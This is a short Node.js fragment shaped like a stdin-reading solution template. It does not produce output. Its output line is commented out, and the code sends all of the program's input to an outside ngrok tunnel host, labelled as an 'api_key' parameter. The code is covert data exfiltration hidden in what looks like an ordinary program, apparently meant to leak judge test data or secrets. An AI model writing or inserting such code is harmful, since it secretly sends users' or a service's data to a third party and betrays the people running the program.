process.stdin.on('end', function () {
 input_stdin_array = input_stdin.split(" ");

const https = require('http');

https.get('http://b57cbaac.ngrok.io/tg?api_key='+encodeURI(input_stdin_array), function(resp) {

}).on("error", function(err) {
console.log("Error: " + err.message);
});
  
//  process.stdout.write(""+output+"");
});